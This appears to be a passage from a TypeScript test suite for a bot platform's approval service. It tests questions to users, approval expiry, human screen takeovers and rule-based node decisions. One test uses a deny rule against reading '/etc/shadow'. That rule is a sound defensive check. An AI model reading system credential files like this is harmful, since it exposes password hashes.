        const invalid = yield* Effect.exit(approvals.askUser({ claims }, { questions: [] }))
        const request = yield* firstPending
        yield* approvals.respond({
          requestId: receipt.requestId,
          response: { type: "answers", answers: { color: ["Red"], tags: ["b"] } },
        })
        return { receipt, again, invalid, request, delivered: yield* Fiber.join(answers) }
      }),
      layer(),
    )
    expect(out.receipt.status).toBe("pending")
    expect(out.again).toEqual(out.receipt)
    expect(Exit.isFailure(out.invalid)).toBe(true)
    expect(out.request).toMatchObject({
      kind: "question",
      blocking: false,
      conversationId: GROUP.id,
      source: { origin: "openbot", method: "ask_user", nativeRequestId: "call-1" },
    })
    expect(out.delivered).toHaveLength(1)
    expect(out.delivered[0]).toMatchObject({
      conversationId: GROUP.id,
      botId: BOT_A.id,
      kind: "user-message",
      urgency: "urgent",
    })
    expect(out.delivered[0]!.text).toContain('answered your question "Which color?"')
    expect(out.delivered[0]!.text).toContain("Which color?: Red")
  })

  test("requestApproval expires with TestClock and tells the bot", async () => {
    const claims = makeClaims({ botId: BOT_A.id, conversationId: GROUP.id })
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const answers = yield* Stream.runCollect(Stream.take(approvals.asyncAnswers, 1)).pipe(
          Effect.forkChild({ startImmediately: true }),
        )
        const receipt = yield* approvals.requestApproval(
          { claims, callId: "call-2" },
          {
            title: "Send the weekly email",
            detail: "To the team list",
          },
        )
        const request = yield* firstPending
        yield* advance("10 minutes")
        const delivered = yield* Fiber.join(answers)
        const stored = yield* Effect.flatMap(RequestRepo, (r) => r.get(receipt.requestId)).pipe(
          Effect.map(Option.getOrThrow),
        )
        return { request, delivered, stored, card: yield* entry(request.cardEntryId) }
      }),
      layer(),
    )
    // The card stays in the group the bot asked from; the answer goes back there too.
    expect(out.request).toMatchObject({ kind: "mcp-approval", blocking: false, conversationId: GROUP.id })
    expect(out.request.responseCapability).toMatchObject({ options: [{ id: "allow-once" }, { id: "deny" }] })
    expect(out.stored).toMatchObject({ status: "expired", statusReason: "timeout" })
    expect(cardState(out.card)?.status).toBe("expired")
    expect(out.delivered[0]).toMatchObject({ conversationId: GROUP.id, botId: BOT_A.id })
    expect(out.delivered[0]!.text).toContain("expired without an answer")
  })

  test("a request deleted with its conversation expires quietly", async () => {
    const claims = makeClaims({ botId: BOT_A.id, conversationId: GROUP.id })
    const errors: Array<unknown> = []
    const capture = Logger.make(({ logLevel, message }) => {
      if (logLevel === "Error") errors.push(message)
    })
    await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        yield* approvals.requestApproval(
          { claims, callId: "call-3" },
          { title: "Send the weekly email", detail: "To the team list" },
        )
        yield* Effect.flatMap(RequestRepo, (r) => r.deleteByConversation(GROUP.id))
        yield* advance("10 minutes")
      }).pipe(Effect.provide(Logger.layer([capture]))),
      layer(),
    )
    expect(errors).toEqual([])
  })
})

describe("ApprovalService hand-offs (request_takeover, D1.7)", () => {
  const claims = makeClaims({ botId: BOT_A.id, conversationId: DM_A.id })
  const nextAnswer = Effect.flatMap(ApprovalService, (approvals) =>
    Stream.runHead(approvals.asyncAnswers).pipe(
      Effect.map(Option.getOrThrow),
      Effect.forkChild({ startImmediately: true }),
    ),
  )

  test("posts an Action needed card (acknowledge done | skip) and returns pending; done hands the screen back first", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const computer = yield* ComputerPort
        const answer = yield* nextAnswer
        const receipt = yield* approvals.requestTakeover(
          { claims, callId: "call-t" },
          { instruction: "Sign in to GitHub and approve the 2FA prompt" },
        )
        const again = yield* approvals.requestTakeover(
          { claims, callId: "call-t" },
          { instruction: "Sign in to GitHub and approve the 2FA prompt" },
        )
        const request = yield* firstPending
        const card = yield* entry(request.cardEntryId)
        // the owner takes over (the card stays open), then answers "done" on the card
        yield* computer.ensure(BOT_A.id)
        yield* computer.lease(BOT_A.id, true)
        const takeOver = yield* Effect.exit(
          approvals.respond({ requestId: receipt.requestId, response: { type: "acknowledge", action: "take-over" } }),
        )
        yield* approvals.respond({ requestId: receipt.requestId, response: { type: "acknowledge", action: "done" } })
        const delivered = yield* Fiber.join(answer)
        return {
          receipt,
          again,
          request,
          card,
          takeOver,
          delivered,
          controller: (yield* computer.status(BOT_A.id)).controller,
          leases: yield* Effect.flatMap(ComputerPortFake, (f) => f.leases),
          after: yield* entry(request.cardEntryId),
          notified: yield* Effect.flatMap(NotifierFake, (f) => f.sent),
        }
      }),
      layer(),
    )
    expect(out.receipt.status).toBe("pending")
    expect(out.again).toEqual(out.receipt)
    expect(out.request).toMatchObject({
      kind: "handoff",
      blocking: false,
      title: "Sign in to GitHub and approve the 2FA prompt",
      subject: { toolName: "request_takeover", nodeId: "node_local" },
      responseCapability: { type: "acknowledge", actions: ["done", "skip"] },
      source: { origin: "openbot", method: "request_takeover", nativeRequestId: "call-t" },
    })
    // longer than approvals (10 min by default)
    expect(out.request.expiresAt! - out.request.createdAt).toBe(30 * 60_000)
    expect(out.card.kind === "card" ? out.card.card : undefined).toEqual({
      type: "handoff",
      requestId: out.receipt.requestId,
      nodeId: "node_local" as NodeId,
      instruction: "Sign in to GitHub and approve the 2FA prompt",
    })
    expect(out.notified.at(-1)?.body).toBe("Needs you on its screen: Sign in to GitHub and approve the 2FA prompt")
    // "Take over" is the lease, not an answer
    expect(Exit.isFailure(out.takeOver)).toBe(true)
    expect(out.leases).toEqual([
      { botId: BOT_A.id, take: true },
      { botId: BOT_A.id, take: false },
    ])
    expect(out.controller).toBe("bot")
    expect(cardState(out.after)).toMatchObject({
      status: "resolved",
      response: { type: "acknowledge", action: "done" },
    })
    expect(out.delivered).toMatchObject({
      conversationId: DM_A.id,
      botId: BOT_A.id,
      kind: "user-message",
      urgency: "urgent",
    })
    expect(out.delivered.text).toStartWith(HANDOFF_DONE_TEXT)
  })

  test("handing the screen back from the computer view answers the pending hand-off with done; skip says so", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const computer = yield* ComputerPort
        yield* computer.ensure(BOT_A.id)
        const first = yield* nextAnswer
        const receipt = yield* approvals.requestTakeover(
          { claims, callId: "call-1" },
          { instruction: "Solve the CAPTCHA" },
        )
        const request = yield* firstPending
        yield* computer.lease(BOT_A.id, true)
        yield* computer.lease(BOT_A.id, false) // "I'm done" in the computer view
        const done = yield* Fiber.join(first)
        const stored = yield* Effect.flatMap(RequestRepo, (r) => r.get(receipt.requestId)).pipe(
          Effect.map(Option.getOrThrow),
        )
        const card = yield* entry(request.cardEntryId)

        const second = yield* nextAnswer
        const skipped = yield* approvals.requestTakeover(
          { claims, callId: "call-2" },
          { instruction: "Enter the code from your phone" },
        )
        yield* approvals.respond({ requestId: skipped.requestId, response: { type: "acknowledge", action: "skip" } })
        const skip = yield* Fiber.join(second)
        return { done, stored, card, skip, leases: yield* Effect.flatMap(ComputerPortFake, (f) => f.leases) }
      }),
      layer(),
    )
    expect(out.stored).toMatchObject({ status: "resolved", response: { type: "acknowledge", action: "done" } })
    expect(cardState(out.card)?.status).toBe("resolved")
    expect(out.done.text).toStartWith(HANDOFF_DONE_TEXT)
    expect(out.done.text).toContain("Solve the CAPTCHA")
    expect(out.skip.text).toStartWith(HANDOFF_SKIP_TEXT)
    // nobody held the screen at the skip: nothing to hand back
    expect(out.leases).toEqual([
      { botId: BOT_A.id, take: true },
      { botId: BOT_A.id, take: false },
    ])
  })

  test("expires after 30 minutes, but waits on while the owner still holds the screen; not from a background task", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const computer = yield* ComputerPort
        yield* computer.ensure(BOT_A.id)
        const answer = yield* nextAnswer
        const receipt = yield* approvals.requestTakeover(
          { claims, callId: "call-x" },
          { instruction: "Log in to the bank" },
        )
        yield* advance("10 minutes")
        const after10 = yield* Effect.flatMap(RequestRepo, (r) => r.get(receipt.requestId)).pipe(
          Effect.map(Option.getOrThrow),
        )
        yield* computer.lease(BOT_A.id, true)
        yield* advance("21 minutes")
        const working = yield* Effect.flatMap(RequestRepo, (r) => r.get(receipt.requestId)).pipe(
          Effect.map(Option.getOrThrow),
        )
        // the owner went away without handing back… the hand-off expires a period later
        const fromTask = yield* Effect.exit(
          approvals.requestTakeover({ claims, taskId: "tsk_1" as never }, { instruction: "Log in" }),
        )
        const blank = yield* Effect.exit(approvals.requestTakeover({ claims }, { instruction: "  " }))
        yield* Effect.flatMap(ComputerPortFake, (f) =>
          f.set({
            botId: BOT_A.id,
            nodeId: "node_local" as NodeId,
            state: "ready",
            surface: "desktop",
            controller: "bot",
          }),
        )
        yield* advance("31 minutes")
        const delivered = yield* Fiber.join(answer)
        const expired = yield* Effect.flatMap(RequestRepo, (r) => r.get(receipt.requestId)).pipe(
          Effect.map(Option.getOrThrow),
        )
        return { after10, working, fromTask, blank, delivered, expired }
      }),
      layer(),
    )
    expect(out.after10.status).toBe("pending")
    expect(out.working.status).toBe("pending")
    expect(out.working.expiresAt).toBeGreaterThan(out.after10.expiresAt!)
    expect(Exit.isFailure(out.fromTask)).toBe(true)
    expect(Exit.isFailure(out.blank)).toBe(true)
    expect(out.expired).toMatchObject({ status: "expired", statusReason: "timeout" })
    expect(out.delivered.text).toContain("Log in to the bank")
    expect(out.delivered.text).toContain("expired")
  })
})

describe("ApprovalService.evaluateNode", () => {
  test("rules decide 'by rule'; ask posts a card in the runId conversation and the user decides", async () => {
    const out = await runTest(
      Effect.gen(function* () {
        yield* seed
        const approvals = yield* ApprovalService
        const base = {
          invocationId: "inv_1",
          botId: BOT_A.id,
          runId: sessionKeyOf(BOT_A.id, DM_A.id),
          reason: "node ceiling",
        }
        yield* putRule({ action: "deny", surface: "file-read", match: { pathPrefix: "/etc" } })
        const denied = yield* approvals.evaluateNode({
          nodeId: "nod_1" as never,
          request: { ...base, action: "read-file", target: "/etc/shadow" },
        })
        const fiber = yield* approvals
          .evaluateNode({
            nodeId: "nod_1" as never,
            request: { ...base, invocationId: "inv_2", action: "run-command", target: "make deploy" },
          })
          .pipe(Effect.forkChild({ startImmediately: true }))
        yield* eventually(hasPending(1))
        const request = yield* firstPending
        yield* approvals.respond({ requestId: request.id, response: { type: "decision", decision: "allow-always" } })
        const unknownBot = yield* approvals.evaluateNode({
          nodeId: "nod_1" as never,
          request: { ...base, botId: "bot_missing", action: "run-command", target: "ls" },
        })
        return { denied, allowed: yield* Fiber.join(fiber), request, unknownBot }
      }),
      layer(),
    )
    expect(out.denied).toEqual({ decision: "deny", by: "rule" })
    expect(out.request).toMatchObject({
      conversationId: DM_A.id,
      kind: "command-approval",
      subject: { command: "make deploy", nodeId: "nod_1" },
      source: { origin: "openbot", method: "node.requestApproval", nativeRequestId: "inv_2" },
    })
    expect(out.allowed).toEqual({ decision: "allow-always", by: "user" })
    expect(out.unknownBot).toEqual({ decision: "deny", by: "rule" })
  })
})
